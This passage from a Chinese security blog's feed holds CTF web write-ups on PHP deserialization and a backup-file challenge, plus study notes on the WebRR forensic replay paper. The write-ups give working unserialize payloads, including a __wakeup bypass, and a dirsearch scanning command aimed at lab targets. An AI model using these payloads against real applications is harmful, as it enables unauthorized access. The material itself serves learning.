src="/2024/02/04/WebWriteUp4/image-20240209190057457.png" alt="image-20240209190057457"></p><p>构造新的payload：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome <span class="hljs-keyword">to</span> the zjctf&amp;file=useless.php&amp;<span class="hljs-keyword">password</span>=O:<span class="hljs-number">4</span>:&quot;Flag&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:&quot;file&quot;;s:<span class="hljs-number">8</span>:&quot;flag.php&quot;;&#125; <br></code></pre></td></tr></table></figure><p><img src="/2024/02/04/WebWriteUp4/image-20240209190541123.png" alt="image-20240209190541123"></p><p>在源码中找到flag</p><!--?phpif(2===3){      return ("flag{2b87fa4f-65d8-41ab-b0c0-f22dab6eca91}");}?-->]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebRR</title>
    <link href="/2024/02/02/WebRR/"/>
    <url>/2024/02/02/WebRR/</url>
    
    <content type="html"><![CDATA[<h2 id="WEBRR-A-Forensic-System-for-Replaying-and-Investigating-Web-Based-Attacks-in-The-Modern-Web"><a href="#WEBRR-A-Forensic-System-for-Replaying-and-Investigating-Web-Based-Attacks-in-The-Modern-Web" class="headerlink" title="WEBRR: A Forensic System for Replaying and Investigating Web-Based Attacks in The Modern Web"></a>WEBRR: A Forensic System for Replaying and Investigating Web-Based Attacks in The Modern Web</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>基于Chromium的浏览器使用多进程架构。主进程是浏览器进程，类似于操作系统级别的内核。然后，在沙箱化的渲染进程中呈现Web内容，这些进程无法直接访问网络或底层文件系统。本文提出的WebRR是基于Chromium浏览器构建的，并且主要在渲染过程中实现</p><blockquote><p>沙箱：</p><p>沙箱是一个 C++ library，沙箱进程便是通过该<code>C++ library</code>所创建，为了确保安全性，沙箱进程所处的执行环境是非常受限的。沙盒进程可以自由使用的唯一资源是 CPU 周期和内存。例如，沙箱进程不能向磁盘写数据或显示它们自己的窗口。沙箱限制了在沙箱内运行代码的 bug 的影响性，例如：这种bug不能在用户帐户中安装持久性恶意软件（因为沙箱禁止写入文件系统）也不能从计算机本地当中读取任何文件。沙箱不能够对系统组件提供保护（如运行它的内核）</p></blockquote><h4 id="渲染进程"><a href="#渲染进程" class="headerlink" title="渲染进程"></a>渲染进程</h4><p>包含四个主要组件</p><ul><li><p><strong>渲染引擎（Blink）</strong>：</p><p><strong>功能：</strong> 负责呈现网站，处理HTML解析、维护DOM（文档对象模型）并实现暴露于V8的网络API。</p><p><strong>多线程性质：</strong> 是一个高度多线程的组件，可以并行处理多个任务。</p></li><li><p><strong>JS引擎（V8）</strong>：</p><p><strong>功能：</strong> 执行Web应用程序中的所有JavaScript组件，包括脚本、回调和事件处理程序。</p><blockquote><p>在 JavaScript 中，函数是对象。因此，函数可以将函数作为参数，并且可以由其他函数返回。执行此操作的函数称为高阶函数。任何作为参数传递的函数都称为回调函数。</p><p>通常用来处理异步</p></blockquote><p><strong>多线程性质：</strong> 每个渲染过程都包括V8引擎的一个实例，用于执行JavaScript代码。</p></li><li><p><strong>绑定层</strong>：</p><p><strong>作用：</strong> 将Blink和V8连接在一起，通过暴露功能实现它们之间的交互。</p><p><strong>生成方式：</strong> 这些API是在编译Chromium时通过绑定生成器生成的，将WebIDL文件编译成C++代码 </p><blockquote><p>WebIDL，全称为Web Interface Definition Language（Web接口定义语言），是一种用于描述Web平台上的API接口的规范语言。它提供了一种形式化的方式，用于定义接口、方法、属性等在Web浏览器和其他环境中实现的API的结构和行为。</p></blockquote></li><li><p><strong>平台层</strong>：</p><p><strong>作用：</strong> 是与浏览器过程通信的附加中间层，允许Blink和V8通过这一层与浏览器过程进行通信。</p></li></ul><h4 id="渲染线程"><a href="#渲染线程" class="headerlink" title="渲染线程"></a>渲染线程</h4><ul><li><strong>渲染线程（Render Thread）：</strong><ul><li><strong>职责：</strong> 渲染线程是渲染进程中的核心组件之一，主要负责处理与页面渲染相关的任务。</li><li>功能：<ul><li>负责将页面的HTML和CSS渲染成可视化的页面，包括布局、样式和绘制等操作。</li><li>执行与页面关联的JavaScript代码，包括通过脚本标签引入的脚本和嵌入在HTML文档中的脚本。</li><li>处理DOM（文档对象模型）的操作，包括对文档元素的增删改查。</li><li>处理与页面相关的事件，例如用户交互和鼠标点击等。</li></ul></li></ul></li><li><strong>WebWorker线程：</strong><ul><li><strong>职责：</strong> WebWorker线程是在后台独立运行的JavaScript线程，与主线程（渲染线程）相互独立，用于执行一些耗时的或需要在后台运行的任务。</li><li>特点：<ul><li>独立于主线程，不阻塞主线程的执行，因此可以提高页面的响应性。</li><li>通过消息传递机制与主线程通信，但无法直接访问DOM。</li><li>可以用于执行复杂的计算、大规模数据处理等任务，而不影响用户界面的交互性。</li></ul></li></ul></li><li><strong>ServiceWorker线程：</strong><ul><li><strong>职责：</strong> ServiceWorker线程也是在后台独立运行的JavaScript线程，但其设计目的是改善离线Web应用的体验，并提供推送通知等功能。</li><li>特点：<ul><li>独立于浏览器窗口和页面，注册后一直在后台运行。</li><li>可以拦截和处理网络请求，包括在离线状态下缓存内容以提供离线访问。</li><li>具有一些特殊的事件，如fetch事件，允许ServiceWorker拦截和修改网络请求。</li><li>可以接收来自后端服务器的推送消息，并触发浏览器通知</li></ul></li></ul></li></ul><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><h4 id="针对的问题"><a href="#针对的问题" class="headerlink" title="针对的问题"></a><strong>针对的问题</strong></h4><p>在企业遭受复杂攻击或发生数据泄漏后，需要进行取证分析，重建和了解攻击的根本原因</p><h4 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h4><p>为解决上述问题，现在已经开发出了系统级的审计系统，包括整个系统的记录和重播方法。但此类方法的主要局限性就是其对Web攻击的分析是有限的，因为系统级抽象（例如进程，套接字，文件），与处理Web攻击相关的必要语义之间存在很大的差距（例如HTML&#x2F;CSS和Javascript）</p><p>所以为了解决这个问题：</p><p>初步尝试就是提出了具有审计功能的安全级浏览器，能提供特定于Web的审计系统。但当前系统是仅记录的系统，不提供重放功能。</p><p>接着就是提出了一些面向Web的记录和回放系统，这些多数关注于支持调试和测试，并没有考虑到安全审计。进行安全级审计，需要在取证环境中保持记录状态，但流行的测试工具Mozilla的rr（record and replay）会导致超过4倍的开销。</p><h4 id="需要满足的条件"><a href="#需要满足的条件" class="headerlink" title="需要满足的条件"></a>需要满足的条件</h4><p>实现取证级的记录和重放：</p><ul><li>确定性重放：即确保重放的路径与记录的路径要一样。如果不同，可能会阻止攻击正确或全部重放，进而导致无法分析攻击的根本原因</li><li>始终在线记录：因为攻击因为攻击是不可预测的和短暂的，所以审计日志记录必须始终打开</li><li>防篡改：审计系统不容易被攻击者篡改或禁用</li><li>可移植：基于Web的取证记录和审计系统要独立于OS和设备</li></ul><h4 id="提出的模型"><a href="#提出的模型" class="headerlink" title="提出的模型"></a>提出的模型</h4><p><img src="/2024/02/02/WebRR/image-20240202202110475.png" alt="image-20240202202110475"></p><p>WEBRR通过利用JavaScript执行单元分区的概念来重新构想如何重放网站，将Web应用的JS分区为一系列JavaScript执行单元（JEUs），其中JEU表示脚本、回调或事件处理程序。接下来，在重放期间，WEBRR通过重放每个单独的JEU同时保留记录的执行顺序来重放应用程序。</p><h4 id="威胁模型"><a href="#威胁模型" class="headerlink" title="威胁模型"></a>威胁模型</h4><p>本实验假设WebRR部署在企业环境中，其威胁模型具有以下特点：</p><ol><li><strong>日志安全性：</strong> WEBRR假设生成的日志是防篡改的，通过加密并存储在安全文件服务器上来确保日志的完整性和安全性。</li><li><strong>个人隐私：</strong> 为了保护用户的个人隐私，不同网站和时间段的日志可以使用不同的密钥进行加密，以减少在调查过程中泄露的个人信息。</li><li><strong>密钥管理：</strong> 加密密钥可以安全地存储在密钥托管中，以确保密钥的安全性，只有在调查需要时才能解密并与分析师共享。</li><li><strong>浏览器安全性：</strong> WEBRR在威胁模型中假设浏览器应用程序在攻击发生时不被破坏，从而可信任记录的日志。即使浏览器被破坏，WEBRR仍然能够记录攻击的所有步骤，直到实际破坏发生。</li></ol><h3 id="WebRR"><a href="#WebRR" class="headerlink" title="WebRR"></a>WebRR</h3><h4 id="记录（record）"><a href="#记录（record）" class="headerlink" title="记录（record）"></a>记录（record）</h4><p>在记录环节，WebRR的策略是将JS执行划分为一些列JEU（例如当脚本插入DOM时，触发事件或执行回调）</p><h5 id="script单元"><a href="#script单元" class="headerlink" title="script单元"></a>script单元</h5><p>划分方式：通过Hook方法，添加到Blink中，使用JS-Execution Uni Recorder模块在JEU开始和结束时记录，具体而言，在Blink中，当一个script标签被插入到DOM中时，对应页面的ScriptController被调用，该Controller调用V8来执行相关的脚本。具体来说，ExecuteScriptAndReturnValue将脚本传递给V8进行执行。为了记录脚本执行，在Blink将控制权传递给V8的地方插入了hook。对于每个执行的脚本，WEBRR记录了帧ID、脚本ID、序列号以及脚本源代码的哈希值，不必记录脚本的源代码，因为在脚本的网络请求发起时，Blink-Platform recording shims将会记录它。</p><blockquote><p>Hook</p><p>叫做 <strong>钩子函数</strong>，在系统调用一个函数之前，钩子程序就先捕获该消息，得到控制权，这时钩子程序既可以加工处理（改变）该函数的执行行为，还可以强制结束消息的传递。</p><p>“Blink-Platform recording shims” </p><p>是指在浏览器引擎 Blink 中的一种机制，用于记录页面加载过程中的各种活动，特别是网络请求和脚本执行。这些记录是为了支持开发者工具、性能分析以及类似的目的。</p><p>ExecuteScriptAndReturnValue </p><p>是 Blink 渲染引擎中的一个函数，用于执行 JavaScript 脚本并返回执行结果的值。</p></blockquote><h5 id="回调单元"><a href="#回调单元" class="headerlink" title="回调单元"></a>回调单元</h5><p>注册回调最常用的 Web API 包括 setTimeout 和 setInterval。当调用 setTimeout 和 setInterval 时，Blink 创建一个 DOMTimer 对象。该对象封装了回调，Blink 将在渲染线程上安排执行 DOMTimer::Execute，以在指定的时间后执行回调。为了记录这些回调单元，WebRR在 DOMTimer::Execute 内部添加Hook，记录回调的执行开始和结束时间。<strong>这是为了在后续的重放过程中能够还原回调函数的执行顺序和时序。</strong></p><blockquote><p><code>setTimeout</code> 用于在指定的延迟之后执行一次回调函数。</p><p><code>setInterval</code> 用于在每个指定的时间间隔内重复执行回调函数。</p><p><code>DOMTimer::Execute</code> 是在 Blink 渲染引擎中用于执行定时器（timer）回调的方法。</p></blockquote><h5 id="事件单元"><a href="#事件单元" class="headerlink" title="事件单元"></a>事件单元</h5><p>为了记录事件，WebRR在 <code>EventTarget::FireEventListeners</code> 中插入钩子，并记录重建事件所需的必要信息。</p><blockquote><p><code>EventTarget::FireEventListeners</code> 负责触发与特定事件相关联的所有事件监听器。其执行过程包括以下步骤：</p><ol><li><strong>获取事件类型：</strong> 确定触发事件监听器的事件类型</li><li><strong>获取事件监听器列表：</strong> 查找与该事件类型相关联的所有事件监听器列表</li><li><strong>逐一执行监听器：</strong> 遍历事件监听器列表，依次执行每个监听器的回调函数</li></ol></blockquote><h4 id="重放（replay）"><a href="#重放（replay）" class="headerlink" title="重放（replay）"></a>重放（replay）</h4><p><img src="/2024/02/02/WebRR/image-20240205212153130.png" alt="image-20240205212153130"></p><p>在重放过程中，操作被从队列中取出，并由 Replay Dispatcher 安排在渲染线程上执行。这个过程会一直进行，直到队列为空。首先，在重放开始时，WEBRR 将回放调度程序安排为渲染线程任务队列的一项任务。接下来，渲染线程的调度程序将执行回放调度程序任务。当这发生时，调度程序将从队列中弹出下一个重放操作，处理它，并在渲染线程上执行。操作如何被“处理”取决于从队列中弹出的重放操作的类型。最后，在操作完成后，WEBRR 通过将调度程序任务放回渲染线程的任务队列，重复这个过程，直到重放操作队列为空。</p><h5 id="JSreplayer"><a href="#JSreplayer" class="headerlink" title="JSreplayer"></a>JSreplayer</h5><p>脚本注册。在 Blink 中，每个 LocalFrame 都引用一个 ScriptRunner 对象和一个 ResourceFetcher 对象。ResourceFetcher 类从网络为该帧下载资源，而 ScriptRunner 充当 ResourceFetcher 与渲染线程调度程序之间的中间人。ScriptRunner 管理脚本的状态，使其从挂起状态过渡到就绪状态。当脚本处于“挂起”状态时，ScriptRunner 正在等待 ResourceFetcher 从网络获取该脚本的源代码。一旦 ResourceFetcher 完成了脚本的下载，脚本将过渡到就绪状态，然后通知 ScriptRunner 在渲染线程上调度该脚本的执行。在重放过程中，我们在 ScriptRunner::NotifyScriptReady 方法中添加了注册挂钩，强制所有处于就绪状态的脚本在其帧的 JSReplayer 中注册自己。</p><p>回调注册。Web 应用程序可以使用 <code>setTimeout</code> 和 <code>setInterval</code> 等 API 注册回调，以在稍后的时间点执行。在 Blink 引擎中，当使用这些 API 注册回调时，它会创建一个 <code>DOMTimer</code> 对象，该对象负责执行此回调。在重放过程中，我们对定时器的构造函数添加了挂钩，以便在创建 <code>DOMTimer</code> 时将其注册到 <code>JSReplayer</code> 中。WEBRR 还通过类似的方法支持回放使用 <code>requestIdleCallback</code> 和 <code>requestAnimationFrame</code> 注册的回调</p><p>EventReplayer 负责重放与事件相关的重放操作，它通过重建在记录期间发生的原始事件，然后将此事件触发到正确的 EventTarget 上来实现。这将调用此事件的任何事件侦听器。事件的重建是通过使用重放操作中提供的信息创建一个 Event 对象来完成的。具体而言，每个重放操作包含创建 blink::Event 类或其子类（例如 MouseEvent、KeyboardEvent 等）所需的所有信息。</p><h5 id="维护DOM状态"><a href="#维护DOM状态" class="headerlink" title="维护DOM状态"></a>维护DOM状态</h5><p>在重放过程中，WEBRR 必须确保在重放 JEU 之前，DOM 的状态与记录期间执行相关 JEU 之前观察到的状态完全相匹配。这确保了在重放期间，JEU 将获得与记录阶段观察到的相同输入。一个主要的挑战是浏览器支持诸如 async 和 defer 等脚本属性，这允许页面的 HTML 在获取资源的同时进行解析；这是在重放期间可能产生的非确定性的一个可能来源。因此，为了实现确定性重放，必须跟踪和记录 DOM 的状态。为此，WEBRR 使用 DOM Recorder 记录由解析器插入 DOM 树的操作。对于每个插入的 DOM 节点，我们记录了在重放期间按正确顺序重建相同 DOM 树所需的信息。在重放期间，为了确保在执行 JEU 之前 DOM 的状态与记录期间相同，WEBRR 禁用了 Blink 的 HTML 解析器，并使用自定义 DOMReplayer 控制何时将 DOM 节点插入到页面文档中（请注意，在记录期间，WEBRR 不更改解析器或页面渲染；更改仅在重放期间应用）。DOMReplayer 面临的主要挑战是确保在执行 JEU 之前，DOM 的状态与记录期间相同。为了实现这一点，我们创建了额外的重放操作来表示 DOM 构造操作。然后，这些 DOM 构造操作被放置在与与 JEUs 相关的重放操作相同的重放队列中，以确保 DOM 构造操作在执行 JEU 之前发生。</p><p>我们在 BlinkPlatform 层实现了这个 shim，因为应用程序发出的所有网络请求都经过这一层。这使我们能够创建一个单一的记录挂钩，可以记录所有网络响应。</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebWriteUp3</title>
    <link href="/2024/02/01/WebWriteUp3/"/>
    <url>/2024/02/01/WebWriteUp3/</url>
    
    <content type="html"><![CDATA[<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p><img src="/2024/02/01/WebWriteUp3/image-20240201102626049.png" alt="image-20240201102626049"></p><p>提示备份网站，但查看源码之后，没发现什么文件</p><p>（查看题解，学到了一种新方法）</p><p>使用dirsearch工具，dirsearch是一个基于python3的命令行工具，常用于暴力扫描页面结构，包括网页中的目录和文件。</p><p>安装</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/maurosoria/</span>dirsearch.git<br>cd dirsearch<br>pip3 install -r requirements.txt<br></code></pre></td></tr></table></figure><p>扫描：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> dirsearch.py -u http://<span class="hljs-number">5</span>d3554e3-<span class="hljs-number">9</span>f8d-<span class="hljs-number">4</span>fb2-a4d7-b045f1a58bd4.node5.buuoj.cn:<span class="hljs-number">81</span>/ -w db/dicc.txt<br></code></pre></td></tr></table></figure><p>有时候扫不出来，要多扫几次，最后能扫出来<a href="http://www.zip,将其下载下来/">www.zip，将其下载下来</a></p><p><img src="/2024/02/01/WebWriteUp3/image-20240201122605748.png" alt="image-20240201122605748"></p><p>flag</p><p>在index.php中可以看到：</p><p><img src="/2024/02/01/WebWriteUp3/image-20240201152917397.png" alt="image-20240201152917397"></p><p>引入class.php,,通过<code>$_GET[&#39;select&#39;]</code>获取了用户传递的参数，然后使用<code>unserialize</code>尝试将这个参数反序列化成对象, <code>@</code>符号来抑制可能的反序列化错误。</p><p><strong>序列化与反序列化</strong></p><p><img src="/2024/02/01/WebWriteUp3/image-20240201160604920.png" alt="image-20240201160604920"></p><p>序列化结果结构：</p><p>O:对象名的长度:”对象名”:对象属性个数:{s:属性名的长度:”属性名”;s:属性值的长度:”属性值”;}</p><p>那么首先对象长度为6，名称为class1，属性个数为3</p><p>对于a：属性为public，1表示变量名长度，a为变量名</p><p>对于b：属性为protected，变量名长度为4（b前添加了%00*%00）</p><p>对于c：属性为private，变量长度为9，因为表示private的方式是：%00类名%00变量名</p><p>对于类中声明的方法，序列化并不会保存下来</p><p>反序列化：</p><p><img src="/2024/02/01/WebWriteUp3/image-20240201161815441.png" alt="image-20240201161815441"></p><p><img src="/2024/02/01/WebWriteUp3/image-20240201161834973.png" alt="image-20240201161834973"></p><p><img src="/2024/02/01/WebWriteUp3/image-20240201161858789.png" alt="image-20240201161858789"></p><p>反序列化只能输出public变量</p><p>class.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br><br>            <br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>魔术方法（Magic Methods）</p><p>所谓魔术方法（Magic Methods），是Python的一种高级语法，允许你在类中自定义函数（函数名格式一般为__xx__），并绑定到类的特殊方法中。比如在类A中自定义__str__()函数，则在调用str(A())时，会自动调用__str__()函数，并返回相应的结果。</p></blockquote><p>其中的wakeup和destruct都是魔术方法，</p><ul><li>__construct():具有构造函数的类会在每次创建新对象时先调用此方法。</li><li>__destruct():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</li><li>__sleep()方法在一个对象被序列化之前调用；</li><li>__wakeup():unserialize( )会检查是否存在一个__wakeup( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。</li></ul><p>那么这题的意图就比较清晰了，如果我们可以构造username&#x3D;admin，password&#x3D;100，然后执行destruct时，就会得到flag，但存在一个wakeup，会吧username修改为guest，现在首先需要构造一个username&#x3D;admin,password&#x3D;100的序列化对象去给它反序列，然后需要绕过wakeup，执行destruct</p><p>构造反序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Name</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-number">100</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;i:<span class="hljs-number">100</span>;&#125;<br></code></pre></td></tr></table></figure><p>所以得到payload：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?<span class="hljs-keyword">select</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;i:<span class="hljs-number">100</span>;&#125;<br></code></pre></td></tr></table></figure><p>在反序列化时，当前属性个数大于实际属性个数时，就会跳过__wakeup()，去执行__destruct</p><p>修改payload：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?<span class="hljs-keyword">select</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;i:<span class="hljs-number">100</span>;&#125;<br></code></pre></td></tr></table></figure><p>由于两个都是私有变量，继续修改payload</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">select</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00password&quot;</span>;i:<span class="hljs-number">100</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/02/01/WebWriteUp3/image-20240201174111628.png" alt="image-20240201174111628"></p><p>得到flag</p><h3 id="BackupFile"><a href="#BackupFile" class="headerlink" title="BackupFile"></a>BackupFile</h3><p>提示为备份文件，常用的后缀有.git .svn .swp .~ .bak .bash_history</p><p>所以一个个尝试，本题是index.php.bak</p><p>下载下来，其内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$key</span>)) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-variable">$str</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source 